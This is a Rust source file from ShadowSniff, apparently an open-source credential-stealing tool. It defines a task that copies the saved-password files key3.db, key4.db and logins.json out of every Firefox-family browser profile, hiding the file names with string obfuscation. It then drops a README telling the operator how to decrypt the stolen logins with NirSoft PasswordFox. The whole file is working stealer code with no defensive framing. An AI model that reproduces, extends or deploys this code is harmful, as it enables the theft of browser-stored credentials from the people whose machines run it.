/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::gecko::GeckoBrowserData;
use alloc::sync::Arc;
use collector::Collector;
use derive_new::new;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{FileSystem, WriteTo, copy_file};
use indoc::indoc;
use obfstr::obfstr as s;
use tasks::Task;

#[derive(new)]
pub(super) struct PasswordTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for PasswordTask<'_> {
    fn run(&self, parent: &Path, filesystem: &F, _collector: &C) {
        let mut at_least_one = false;

        for profile in &self.browser.profiles {
            let Some(name) = profile.name() else {
                continue;
            };

            [s!("key3.db"), s!("key4.db"), s!("logins.json")]
                .iter()
                .for_each(|file| {
                    let _ = copy_file(
                        StorageFileSystem,
                        profile / file,
                        filesystem,
                        parent / name,
                        true,
                    )
                    .map(|_| at_least_one = true);
                })
        }

        if at_least_one {
            let content = indoc! {r#"
                Decrypting saved passwords from Gecko-based browsers is seriously a pain.
                Over the years, Mozilla has changed the way they store and encrypt data, and many modern tools no longer support all formats.

                But for now, included in each profile directory are just the essential files needed to view saved passwords using a free and simple utility:
                👉 PasswordFox by NirSoft https://www.nirsoft.net/utils/passwordfox.html

                No installation needed — just run the program, point it to the profile folder, and it should display any saved logins.

                Good luck — you’ll need it.
            "#};

            let _ = content.write_to(filesystem, parent / "README.txt");
        }
    }
}
